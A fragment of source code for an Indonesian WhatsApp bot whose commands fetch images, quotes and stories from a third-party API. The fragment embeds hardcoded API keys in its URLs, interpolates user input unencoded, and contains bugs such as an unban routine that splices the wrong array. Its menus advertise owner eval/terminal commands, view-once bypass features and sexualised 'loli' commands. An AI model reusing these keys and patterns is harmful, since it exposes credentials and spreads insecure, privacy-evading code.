 buff = await getBuffer(`https://api.lolhuman.xyz/api/photooxy1/${command}?apikey=IkyChan&text=${ini_txt}`)



 buttons = [{buttonId: noprefix ? "menu" : "!"+"menu",buttonText:{displayText: `BACK MENU`},type:1}]



 imageMsg = (await wann.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage



 buttonsMessage = {footerText:'follow @achyrr_wann', imageMessage: imageMsg,



 contentText:`©WhatsApp bot`,buttons,headerType:4}



 prep = await wann.prepareMessageFromContent(from,{buttonsMessage},{quoted: freply})



 wann.relayWAMessage(prep)







 break



 case 'ttlogo':



 case 'arcade8bit':



 case 'battlefield4':



 case 'pubg':



 reply (mess.wait)



 if (args.length == 0) return reply(`Example: ${prefix + command} LoL Human`)



txt1 = args[0]



 txt2 = args[1]



 buff = await getBuffer(`https://api.lolhuman.xyz/api/photooxy2/${command}?apikey=IkyChan&text1=${txt1}&text2=${txt2}`)



 buttons = [{buttonId: noprefix ? "menu" : "!"+"menu",buttonText:{displayText: `BACK MENU`},type:1}]



 imageMsg = (await wann.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage



 buttonsMessage = {footerText:'follow @achyrr_wann', imageMessage: imageMsg,



 contentText:`©WhatsApp bot`,buttons,headerType:4}



 prep = await wann.prepareMessageFromContent(from,{buttonsMessage},{quoted: freply})



 wann.relayWAMessage(prep)







 break







 // Ephoto 360 //



 case 'wetglass':



 case 'multicolor3d':



 case 'watercolor':



 case 'luxurygold':



 case 'galaxywallpaper':



 case 'lighttext':



 case 'beautifulflower':



 case 'puppycute':



 case 'royaltext':



 case 'heartshaped':



 case 'birthdaycake':



 case 'galaxystyle':



 case 'hologram3d':



 case 'greenneon':



 case 'glossychrome':



 case 'greenbush':



 case 'metallogo':



 case 'noeltext':



 case 'glittergold':



 case 'textcake':



 case 'starsnight':



 case 'wooden3d':



 case 'textbyname':



 case 'writegalacy':



 case 'galaxybat':



 case 'snow3d':



 case 'birthdayday':



 case 'goldplaybutton':



 case 'silverplaybutton':



 case 'freefire':



 reply (mess.wait)



 if (args.length == 0) return reply(`Example: ${prefix + command} LoL Human`)



ini_txt = args.join(" ")



 buff = await getBuffer(`https://api.lolhuman.xyz/api/ephoto1/${command}?apikey=IkyChan&text=${ini_txt}`)



 buttons = [{buttonId: noprefix ? "menu" : "!"+"menu",buttonText:{displayText: `BACK MENU`},type:1}]



 imageMsg = (await wann.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage



 buttonsMessage = {footerText:'follow @achyrr_wann', imageMessage: imageMsg,



 contentText:`©WhatsApp bot`,buttons,headerType:4}



 prep = await wann.prepareMessageFromContent(from,{buttonsMessage},{quoted: freply})



 wann.relayWAMessage(prep)







 break



 case 'setwelcome':







 if (args.length < 1) return reply('*Teks nya mana gan?*')



wann.updatePresence(from, Presence.composing) 



 if (args.length < 1) return



  join = body.slice(11)



wann.sendMessage(from ,`\`\`\`Welcome berhasil di ubah menjadi : ${body.slice(11)}\`\`\``, text,{quoted : freply})



break 







 case "example":



 case "contoh":



 sendButMessage(from, `Please select the language you use`, `Choose a language below`, [



 {



buttonId: `${prefix}exampleid`,



buttonText: {



  displayText: `⬡ INDONESIA `,



},



type: 1,



 },



 {



buttonId: `${prefix}exampleen`,



buttonText: {



  displayText: `⬡ ENGLISH`,



},



type: 1,



 },



 ]);



 break;



  

  case 'ban': case 'banned': case 'block':

          if (!wan.key.fromMe && !isOwner) return reply(lang.onlyOwner())

          bnnd = `${args[0].replace('@', '')}@s.whatsapp.net`

					banned.push(bnnd)

					fs.writeFileSync('./database/banned.json', JSON.stringify(banned))

					fakestatus(`Nomor ${bnnd} telah dibanned!`)

          break



        case 'unban': case 'unbannned': case 'unblock':

          if (!wan.key.fromMe && !isOwner) return reply(lang.onlyOwner())

          ya = `${args[0].replace('@', '')}@s.whatsapp.net`

					unb = banned.indexOf(ya)

					ban.splice(unb, 1)

					fs.writeFileSync('./database/banned.json', JSON.stringify(banned))

					fakestatus(`Nomor ${ya} telah di unban!`)

          break



  case 'quotes':

    quotes = await fetchJson(`https://api.lolhuman.xyz/api/random/quotes?apikey=WannOff`)

    quotes = quotes.result

    author = quotes.by

    quotes = quotes.quote

    reply(`_${quotes}_\n\n*â€• ${author}*`)

    break

case 'quotesanime':

    quotes = await fetchJson(`https://api.lolhuman.xyz/api/random/quotesnime?apikey=WannOff`)

    quotes = quotes.result

    quote = quotes.quote

    char = quotes.character

    anime = quotes.anime

    episode = quotes.episode

    reply(`_${quote}_\n\n*• ${char}*\n*• ${anime} ${episode}*`)

    break

case 'quotesdilan':

    get_result = await fetchJson(`https://api.lolhuman.xyz/api/quotes/diLan?apikey=WannOff`)

     reply(get_result.result)



   break

    break

case 'quotesimage':

               buff = await getBuffer(`https://api.lolhuman.xyz/api/random/${command}?apikey=WannOff`)

                    buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `➡️Next`},type:1}]

              imageMsg = (await wann.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage

              buttonsMessage = {footerText:'Crated By follow @bnyak_pnderr', imageMessage: imageMsg,

              contentText: 'Ini Kak',buttons,headerType:4}

              prep = await wann.prepareMessageFromContent(from,{buttonsMessage},{quoted: freply})

              wann.relayWAMessage(prep)

                 break



  case 'faktaunik':



  case 'katabijak':



  case 'pantun':



  case 'bucin':



  get_result = await fetchJson(`https://api.lolhuman.xyz/api/random/${command}?apikey=IkyChan`)



  titid = get_result.result



  sendButMessage(from, titid, `Klik Untuk Ke Quotes Selanjutnya`, [



  {



buttonId: `${prefix + command}`,



buttonText: {



  displayText: `⬡ NEXT `,



},



type: 1,



 },]);



  break;



  break



  case 'randomnama':



  anu = await fetchJson(`https://api.lolhuman.xyz/api/random/nama?apikey=IkyChan`)



  kyyi = anu.result



  sendButMessage(from, kyyi, `Klik Untuk Ke Quotes Selanjutnya`, [



  {



buttonId: `${prefix + command}`,



buttonText: {



  displayText: `⬡ NEXT `,



},



type: 1,



 },]);



  break;



  break



 // Movie & Story



 case 'lk21':



 if (args.length == 0) return reply(`Example: ${prefix + command} Transformer`)



  query = args.join(" ")



get_result = await fetchJson(`https://api.lolhuman.xyz/api/lk21?apikey=IkyChan&query=${query}`)



get_result = get_result.result



ini_txt = `Title : ${get_result.title}\n`



ini_txt += `Link : ${get_result.link}\n`



ini_txt += `Genre : ${get_result.genre}\n`



ini_txt += `Views : ${get_result.views}\n`



ini_txt += `Duration : ${get_result.duration}\n`



ini_txt += `Tahun : ${get_result.tahun}\n`



ini_txt += `Rating : ${get_result.rating}\n`



ini_txt += `Desc : ${get_result.desc}\n`



ini_txt += `Actors : ${get_result.actors.join(", ")}\n`



ini_txt += `Location : ${get_result.location}\n`



ini_txt += `Date Release : ${get_result.date_release}\n`



ini_txt += `Language : ${get_result.Language}\n`



ini_txt += `Link Download : ${get_result.link_dl}`



thumbnail = await getBuffer(get_result.thumbnail)



await wann.sendMessage(from, thumbnail, image, { quoted: freply, caption: ini_txt })



break



case 'drakorongoing':



get_result = await fetchJson(`https://api.lolhuman.xyz/api/drakorongoing?apikey=IkyChan`)



get_result = get_result.result



ini_txt = "Ongoing Drakor\n\n"



for (var x of get_result) {



  ini_txt += `Title : ${x.title}\n`



  ini_txt += `Link : ${x.link}\n`



  ini_txt += `Thumbnail : ${x.thumbnail}\n`



  ini_txt += `Year : ${x.category}\n`



  ini_txt += `Total Episode : ${x.total_episode}\n`



  ini_txt += `Genre : ${x.genre.join(", ")}\n\n`



}



reply(ini_txt)



break



case 'wattpad':



if (args.length == 0) return reply(`Example: ${prefix + command} https://www.wattpad.com/707367860-kumpuLan-quote-tere-liye-tere-liye-quote-quote`)



  ini_url = args[0]



get_result = await fetchJson(`https://api.lolhuman.xyz/api/wattpad?apikey=IkyChan&url=${ini_url}`)



get_result = get_result.result



ini_txt = `Title : ${get_result.title}\n`



ini_txt += `Rating : ${get_result.rating}\n`



ini_txt += `Motify date : ${get_result.modifyDate}\n`



ini_txt += `Create date: ${get_result.createDate}\n`



ini_txt += `Word : ${get_result.word}\n`



ini_txt += `Comment : ${get_result.comment}\n`



ini_txt += `Vote : ${get_result.vote}\n`



ini_txt += `Reader : ${get_result.reader}\n`



ini_txt += `Pages : ${get_result.pages}\n`



ini_txt += `Description : ${get_result.desc}\n\n`



ini_txt += `Story : \n${get_result.story}`



thumbnail = await getBuffer(get_result.photo)



await wann.sendMessage(from, thumbnail, image, { quoted: freply, caption: ini_txt })



break



case 'wattpadsearch':



if (args.length == 0) return reply(`Example: ${prefix + command} Tere Liye`)



  query = args.join(" ")



get_result = await fetchJson(`https://api.lolhuman.xyz/api/wattpadsearch?apikey=IkyChan&query=${query}`)



get_result = get_result.result



ini_txt = "Wattpad Seach : \n"



for (var x of get_result) {



  ini_txt += `Title : ${x.title}\n`



  ini_txt += `Url : ${x.url}\n`



  ini_txt += `Part : ${x.parts}\n`



  ini_txt += `Motify date : ${x.modifyDate}\n`



  ini_txt += `Create date: ${x.createDate}\n`



  ini_txt += `Coment count: ${x.commentCount}\n\n`



}



reply(ini_txt)



break



case 'cerpen':



get_result = await fetchJson(`https://api.lolhuman.xyz/api/cerpen?apikey=IkyChan`)



get_result = get_result.result



ini_txt = `Title : ${get_result.title}\n`



ini_txt += `Creator : ${get_result.creator}\n`



ini_txt += `Story :\n${get_result.cerpen}`



titid = ini_txt



sendButMessage(from, titid, `Klik Untuk Ke Quotes Selanjutnya`, [



{



  buttonId: `${prefix + command}`,



  buttonText: {



 displayText: `⬡ NEXT `,



  },



  type: 1,



},]);



break;



break



case 'ceritahoror':



get_result = await fetchJson(`https://api.lolhuman.xyz/api/ceritahoror?apikey=IkyChan`)



get_result = get_result.result



ini_txt = `Title : ${get_result.title}\n`



ini_txt += `Desc : ${get_result.desc}\n`



ini_txt += `Story :\n${get_result.story}\n`



buff = await getBuffer(get_result.thumbnail)



buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `➡️Next`},type:1}]



imageMsg = (await wann.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage



buttonsMessage = {footerText:'follow @achyrr_wann', imageMessage: imageMsg,



contentText: ini_txt,buttons,headerType:4}



prep = await wann.prepareMessageFromContent(from,{buttonsMessage},{quoted: freply})



wann.relayWAMessage(prep)



break







case 'grupmenu':



case 'groupmenu':



case 'menugroup':



case 'menugrup':







wibu = `${botName}















  𝐋𝐈𝐒𝐓 𝐌𝐄𝐍𝐔



▹  ɢʀᴏᴜᴘꜱᴇᴛᴛɪɴɢ



▹  ᴀꜰᴋ *ᴀʟᴀꜱᴀɴ*



▹  ᴄᴇᴋꜱᴇᴡᴀ



▹  ᴋɪᴄᴋᴀʟʟ



▹  ɪɴꜰᴏɢʀᴜᴘ



▹  ᴘʀᴏᴍᴏᴛᴇ



▹  ᴅᴇᴍᴏᴛᴇ



▹  ʟɪꜱᴛᴏɴʟɪɴᴇ



▹  ᴛᴀɢᴀʟʟ *ᴛᴇᴋꜱ*



▹  voting *!voting @tag | alasan | 1-100 menit



▹  delvote *hapus sesi vote di grup*



▹  ᴛᴀɢᴀʟʟ *ᴛᴇᴋꜱ*



▹  ʟᴇᴀᴠᴇ



▹  ᴋɪᴄᴋ *ʀᴇᴘʟʏ*



▹  ᴀᴅᴅ *+62xxxxxx*



▹  ꜱᴇᴛɢʀᴜᴘɴᴀᴍᴇ



▹  ꜱᴇᴛᴘᴘɢʀᴜᴘ



▹  ꜱᴇᴛᴅᴇꜱᴄ



▹  antidel *enable/disable*



▹  antiviewonce *enable/disable*



▹  ꜱɪᴅᴇʀ *ʀᴇᴘʟʏ ᴄʜᴀᴛ ʙᴏᴛ*



▹  ʜɪᴅᴇᴛᴀɢ *ᴛᴇᴋꜱ/ʀᴇᴘʟʏ ᴛᴇᴋꜱ*



`



sendButMessage(from, wibu, `created follow @achyrr_wann`, [



{



  buttonId: noprefix ? "menu" : "!"+"menu",



  buttonText: {



 displayText: `⬡ BACK TO MENU `,



  },



  type: 1,



},]);



break;



case 'storymenu':



case 'moviemenu':



case 'menumovie':







wibu = `${botName}











  𝐋𝐈𝐒?? 𝐌𝐄𝐍𝐔



▹ ${prefix}drakorongoing



▹ ${prefix}lk21 query



▹ ${prefix}wattpad url_wattpad



▹ ${prefix}wattpadsearch query



▹ ${prefix}cerpen



▹ ${prefix}ceritahoror`



sendButMessage(from, wibu, `created follow @achyrr_wann`, [



{



  buttonId: noprefix ? "menu" : "!"+"menu",



  buttonText: {



 displayText: `⬡ BACK TO MENU `,



  },



  type: 1,



},]);



break;







case 'randomtext':











wibu =`  𝐋𝐈𝐒𝐓 𝐌𝐄𝐍U



▹ ${prefix}quotes



▹ ${prefix}quotesdiLan



▹ ${prefix}quotesanime



▹ ${prefix}quotesimage



▹ ${prefix}faktaunik



▹ ${prefix}katabijak



▹ ${prefix}pantun



▹ ${prefix}bucin



▹ ${prefix}randomnama`



sendButMessage(from, wibu, `created follow @achyrr_wann`, [



{



  buttonId: noprefix ? "menu" : "!"+"menu",



  buttonText: {



 displayText: `⬡ BACK TO MENU `,



  },



  type: 1,



},]);



break;







case 'ownermenu':



case  'menuowner':







wibu =`



 𝐋𝐈𝐒𝐓 𝐌𝐄𝐍𝐔



▹  ${prefix}bc *teks*



▹  ${prefix}term



▹  ${prefix}self



▹  ${prefix}public



▹  ${prefix}eval



▹  ${prefix}reset



▹  ${prefix}clearall



▹  ${prefix}leaveall



▹  ${prefix}addvn



▹  ${prefix}getvn



▹  ${prefix}addimage



▹  ${prefix}getimage



▹  ${prefix}addvideo



▹  ${prefix}getvideo



▹  ${prefix}slow



▹  ${prefix}leaveall



▹  ${prefix}join *link gc*



▹  ${prefix}shutdown



▹  ${prefix}getquoted



▹  ${prefix}addupdate *fiturnya*



▹  ${prefix}exif *nama|author*



▹  ${prefix}sewa add/del *waktunya*



▹  ${prefix}premium add @tag|nomor



▹  ${prefix}premium del @tag|nomor



`







sendButMessage(from, wibu, `created follow @achyrr_wann`, [



{



  buttonId: noprefix ? "menu" : "!"+"menu",



  buttonText: {



 displayText: `⬡ BACK TO MENU `,



  },



  type: 1,



},]);



break;



case 'wibumenu':



case  'menuwibu':



wibu =`${botName}











 𝐋𝐈𝐒𝐓 𝐌𝐄𝐍𝐔



▹  ${prefix}loli



▹  ${prefix}manga



▹  ${prefix}anime 



▹  ${prefix}lolivideo



▹  ${prefix}husbu



▹  ${prefix}waifu



▹  ${prefix}milf



▹  ${prefix}neko



▹  ${prefix}kanna



▹  ${prefix}sagiri



▹  ${prefix}hentai



▹  ${prefix}cosplay



▹  ${prefix}wallnime



▹  ${prefix}kusonime



▹  ${prefix}megumin



▹  ${prefix}otakudesu



▹  ${prefix}doujindesu



▹  ${prefix}storyanime



▹  ${prefix}nakanomiku



▹  ${prefix}nakanoikyy



▹  ${prefix}nakanoitsuki



▹  ${prefix}otakuongoing



▹  ${prefix}nhentai *code*



▹  ${prefix}nekopoi *link*



▹  ${prefix}nekopoisearch



`







sendButMessage(from, wibu, `created follow @achyrr_wann`, [



{



  buttonId: noprefix ? "menu" : "!"+"menu",



  buttonText: {



 displayText: `⬡ BACK TO MENU `,



  },



  type: 1,



},]);



break;











case 'downloadmenu':



case  'menudownload':



wibu =`



 𝐋𝐈𝐒𝐓 𝐌𝐄𝐍𝐔



▹  ${prefix}fb 



▹  ${prefix}igdl 



▹  ${prefix}igdl2 



▹  ${prefix}twitter 



▹  ${prefix}tiktok 



▹  ${prefix}play 



▹  ${prefix}ythd 



▹  ${prefix}ytmp3 



▹  ${prefix}ytmp4 



▹  ${prefix}soundcloud 



▹  ${prefix}tiktoknowm 



▹  ${prefix}tiktokaudio



▹  ${prefix}mediafire 



▹  ${prefix}nhentaipdf *code* `







sendButMessage(from, wibu, `created follow @achyrr_wann`, [



{



  buttonId: noprefix ? "menu" : "!"+"menu",



  buttonText: {



 displayText: `⬡ BACK TO MENU `,



  },



  type: 1,



},]);



break;


case 'fuutarou': 
					buff = await getBuffer(`http://api.lolhuman.xyz/api/gimage?apikey=${setting.lolkey}&query=fuutarou`)
          buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `NEXT`},type:1}]
              imageMsg = (await wann.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
              buttonsMessage = {footerText:'Fuutarou', imageMessage: imageMsg,
              contentText:`©WhatsApp bot`,buttons,headerType:4}
              prep = await wann.prepareMessageFromContent(from,{buttonsMessage},{quoted: freply})
              wann.relayWAMessage(prep)

					break 
//==============================================================================================
case 'itsuki': 
					buff = await getBuffer(`http://api.lolhuman.xyz/api/gimage?apikey=${setting.lolkey}&query=itsuki`)
          buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `NEXT`},type:1}]
              imageMsg = (await wann.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
              buttonsMessage = {footerText:'Fuutarou', imageMessage: imageMsg,
              contentText:`©WhatsApp bot`,buttons,headerType:4}
              prep = await wann.prepareMessageFromContent(from,{buttonsMessage},{quoted: freply})
              wann.relayWAMessage(prep)

					break 
//==============================================================================================
case 'itsuki': 
					buff = await getBuffer(`http://api.lolhuman.xyz/api/gimage?apikey=${setting.lolkey}&query=itsuki`)
          buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `NEXT`},type:1}]
              imageMsg = (await wann.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
              buttonsMessage = {footerText:'Itsuki', imageMessage: imageMsg,
              contentText:`©WhatsApp bot`,buttons,headerType:4}
              prep = await wann.prepareMessageFromContent(from,{buttonsMessage},{quoted: freply})
              wann.relayWAMessage(prep)

					break 
//==============================================================================================
case 'nino': 
					buff = await getBuffer(`http://api.lolhuman.xyz/api/gimage?apikey=${setting.lolkey}&query=nino`)
          buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `NEXT`},type:1}]
              imageMsg = (await wann.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
              buttonsMessage = {footerText:'Nino', imageMessage: imageMsg,
              contentText:`©WhatsApp bot`,buttons,headerType:4}
              prep = await wann.prepareMessageFromContent(from,{buttonsMessage},{quoted: freply})
              wann.relayWAMessage(prep)

					break 
//============================================= 
case 'yotsuba': 
					buff = await getBuffer(`http://api.lolhuman.xyz/api/gimage?apikey=${setting.lolkey}&query=yotsuba`)
          buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `NEXT`},type:1}]
              imageMsg = (await wann.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
              buttonsMessage = {footerText:'Yotsuba', imageMessage: imageMsg,
              contentText:`©WhatsApp bot`,buttons,headerType:4}
              prep = await wann.prepareMessageFromContent(from,{buttonsMessage},{quoted: freply})
              wann.relayWAMessage(prep)

					break 
//============================================= 
case 'naruto': 
					buff = await getBuffer(`http://api.lolhuman.xyz/api/gimage?apikey=${setting.lolkey}&query=naruto`)
          buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `NEXT`},type:1}]
              imageMsg = (await wann.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
              buttonsMessage = {footerText:'Naruto', imageMessage: imageMsg,
              contentText:`©WhatsApp bot`,buttons,headerType:4}
              prep = await wann.prepareMessageFromContent(from,{buttonsMessage},{quoted: freply})
              wann.relayWAMessage(prep)

					break 
//============================================= 
case 'mikasa': 
					buff = await getBuffer(`http://api.lolhuman.xyz/api/gimage?apikey=${setting.lolkey}&query=mikasa`)
          buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `NEXT`},type:1}]
              imageMsg = (await wann.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
              buttonsMessage = {footerText:'Mikasa', imageMessage: imageMsg,
              contentText:`©WhatsApp bot`,buttons,headerType:4}
              prep = await wann.prepareMessageFromContent(from,{buttonsMessage},{quoted: freply})
              wann.relayWAMessage(prep)

					break 
//============================================= 
case 'eren': 
					buff = await getBuffer(`http://api.lolhuman.xyz/api/gimage?apikey=${setting.lolkey}&query=eren`)
          buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `NEXT`},type:1}]
              imageMsg = (await wann.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
              buttonsMessage = {footerText:'Eren', imageMessage: imageMsg,
              contentText:`©WhatsApp bot`,buttons,headerType:4}
              prep = await wann.prepareMessageFromContent(from,{buttonsMessage},{quoted: freply})
              wann.relayWAMessage(prep)

					break 
//============================================= 
case 'titan': 
					buff = await getBuffer(`http://api.lolhuman.xyz/api/gimage?apikey=${setting.lolkey}&query=titan`)
          buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `NEXT`},type:1}]
              imageMsg = (await wann.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
              buttonsMessage = {footerText:'Titan', imageMessage: imageMsg,
              contentText:`©WhatsApp bot`,buttons,headerType:4}
              prep = await wann.prepareMessageFromContent(from,{buttonsMessage},{quoted: freply})
              wann.relayWAMessage(prep)

					break 
//============================================= 
case 'levi': 
					buff = await getBuffer(`http://api.lolhuman.xyz/api/gimage?apikey=${setting.lolkey}&query=levi`)
          buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `NEXT`},type:1}]
              imageMsg = (await wann.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
              buttonsMessage = {footerText:'Levi', imageMessage: imageMsg,
              contentText:`©WhatsApp bot`,buttons,headerType:4}
              prep = await wann.prepareMessageFromContent(from,{buttonsMessage},{quoted: freply})
              wann.relayWAMessage(prep)

					break 
//============================================= 
case 'sakura': 
					buff = await getBuffer(`http://api.lolhuman.xyz/api/gimage?apikey=${setting.lolkey}&query=sakura`)
          buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `NEXT`},type:1}]
              imageMsg = (await wann.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
              buttonsMessage = {footerText:'Sakura', imageMessage: imageMsg,
              contentText:`©WhatsApp bot`,buttons,headerType:4}
              prep = await wann.prepareMessageFromContent(from,{buttonsMessage},{quoted: freply})
              wann.relayWAMessage(prep)

					break 
//============================================= 
case 'hinata': 
					buff = await getBuffer(`http://api.lolhuman.xyz/api/gimage?apikey=${setting.lolkey}&query=hinata`)
          buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `NEXT`},type:1}]
              imageMsg = (await wann.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
              buttonsMessage = {footerText:'Hinata', imageMessage: imageMsg,
              contentText:`©WhatsApp bot`,buttons,headerType:4}
              prep = await wann.prepareMessageFromContent(from,{buttonsMessage},{quoted: freply})
              wann.relayWAMessage(prep)

					break 
//============================================= 
case 'neji': 
					buff = await getBuffer(`http://api.lolhuman.xyz/api/gimage?apikey=${setting.lolkey}&query=neji`)
          buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `NEXT`},type:1}]
              imageMsg = (await wann.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
              buttonsMessage = {footerText:'Neji', imageMessage: imageMsg,
              contentText:`©WhatsApp bot`,buttons,headerType:4}
              prep = await wann.prepareMessageFromContent(from,{buttonsMessage},{quoted: freply})
              wann.relayWAMessage(prep)

					break 
//============================================= 
case 'minato': 
					buff = await getBuffer(`http://api.lolhuman.xyz/api/gimage?apikey=${setting.lolkey}&query=minato`)
          buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `NEXT`},type:1}]
              imageMsg = (await wann.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
              buttonsMessage = {footerText:'Minato', imageMessage: imageMsg,
              contentText:`©WhatsApp bot`,buttons,headerType:4}
              prep = await wann.prepareMessageFromContent(from,{buttonsMessage},{quoted: freply})
              wann.relayWAMessage(prep)

					break 
//=============================================
case 'jiraya': 
					buff = await getBuffer(`http://api.lolhuman.xyz/api/gimage?apikey=${setting.lolkey}&query=jiraya`)
          buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `NEXT`},type:1}]
              imageMsg = (await wann.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
              buttonsMessage = {footerText:'Jiraya', imageMessage: imageMsg,
              contentText:`©WhatsApp bot`,buttons,headerType:4}
              prep = await wann.prepareMessageFromContent(from,{buttonsMessage},{quoted: freply})
              wann.relayWAMessage(prep)

					break  
//============================================= 
case 'tsunade': 
					buff = await getBuffer(`http://api.lolhuman.xyz/api/gimage?apikey=${setting.lolkey}&query=tsunade`)
          buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `NEXT`},type:1}]
              imageMsg = (await wann.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
              buttonsMessage = {footerText:'Tsunade', imageMessage: imageMsg,
              contentText:`©WhatsApp bot`,buttons,headerType:4}
              prep = await wann.prepareMessageFromContent(from,{buttonsMessage},{quoted: freply})
              wann.relayWAMessage(prep)

					break 
//============================================= 
case 'kiba': 
					buff = await getBuffer(`http://api.lolhuman.xyz/api/gimage?apikey=${setting.lolkey}&query=kiba`)
          buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `NEXT`},type:1}]
              imageMsg = (await wann.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
              buttonsMessage = {footerText:'Kiba', imageMessage: imageMsg,
              contentText:`©WhatsApp bot`,buttons,headerType:4}
              prep = await wann.prepareMessageFromContent(from,{buttonsMessage},{quoted: freply})
              wann.relayWAMessage(prep)

					break 
//============================================= 
case 'armin': 
					buff = await getBuffer(`http://api.lolhuman.xyz/api/gimage?apikey=${setting.lolkey}&query=armin`)
          buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `NEXT`},type:1}]
              imageMsg = (await wann.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
              buttonsMessage = {footerText:'Armin', imageMessage: imageMsg,
              contentText:`©WhatsApp bot`,buttons,headerType:4}
              prep = await wann.prepareMessageFromContent(from,{buttonsMessage},{quoted: freply})
              wann.relayWAMessage(prep)

					break 
//=============================================  
case 'bertholdt': 
					buff = await getBuffer(`http://api.lolhuman.xyz/api/gimage?apikey=${setting.lolkey}&query=bertholdt`)
          buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `NEXT`},type:1}]
              imageMsg = (await wann.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
              buttonsMessage = {footerText:'Bertholdt', imageMessage: imageMsg,
              contentText:`©WhatsApp bot`,buttons,headerType:4}
              prep = await wann.prepareMessageFromContent(from,{buttonsMessage},{quoted: freply})
              wann.relayWAMessage(prep)

					break 
//=============================================  
case 'erwin': 
					buff = await getBuffer(`http://api.lolhuman.xyz/api/gimage?apikey=${setting.lolkey}&query=erwin`)
          buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `NEXT`},type:1}]
              imageMsg = (await wann.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
              buttonsMessage = {footerText:'Erwin', imageMessage: imageMsg,
              contentText:`©WhatsApp bot`,buttons,headerType:4}
              prep = await wann.prepareMessageFromContent(from,{buttonsMessage},{quoted: freply})
              wann.relayWAMessage(prep)

					break 
//=============================================  
case 'lolicans': 
					buff = await getBuffer(`http://api.lolhuman.xyz/api/gimage?apikey=${setting.lolkey}&query=lolicans`)
          buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `NEXT`},type:1}]
              imageMsg = (await wann.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
              buttonsMessage = {footerText:'Lolicans', imageMessage: imageMsg,
              contentText:`©WhatsApp bot`,buttons,headerType:4}
              prep = await wann.prepareMessageFromContent(from,{buttonsMessage},{quoted: freply})
              wann.relayWAMessage(prep)

					break 
//=============================================  
case 'annie': 
					buff = await getBuffer(`http://api.lolhuman.xyz/api/gimage?apikey=${setting.lolkey}&query=annie`)
          buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `NEXT`},type:1}]
              imageMsg = (await wann.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
              buttonsMessage = {footerText:'annie', imageMessage: imageMsg,
              contentText:`©WhatsApp bot`,buttons,headerType:4}
              prep = await wann.prepareMessageFromContent(from,{buttonsMessage},{quoted: freply})
              wann.relayWAMessage(prep)

					break 
//=============================================  
case 'jean': 
					buff = await getBuffer(`http://api.lolhuman.xyz/api/gimage?apikey=${setting.lolkey}&query=jean`)
          buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `NEXT`},type:1}]
              imageMsg = (await wann.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
              buttonsMessage = {footerText:'Jean', imageMessage: imageMsg,
              contentText:`©WhatsApp bot`,buttons,headerType:4}
              prep = await wann.prepareMessageFromContent(from,{buttonsMessage},{quoted: freply})
              wann.relayWAMessage(prep)

					break 
//=============================================  
case 'connie': 
					buff = await getBuffer(`http://api.lolhuman.xyz/api/gimage?apikey=${setting.lolkey}&query=connie`)
          buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `NEXT`},type:1}]
              imageMsg = (await wann.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
              buttonsMessage = {footerText:'Connie', imageMessage: imageMsg,
              contentText:`©WhatsApp bot`,buttons,headerType:4}
              prep = await wann.prepareMessageFromContent(from,{buttonsMessage},{quoted: freply})
              wann.relayWAMessage(prep)

					break 
//=============================================  
case 'historia': 
					buff = await getBuffer(`http://api.lolhuman.xyz/api/gimage?apikey=${setting.lolkey}&query=historia`)
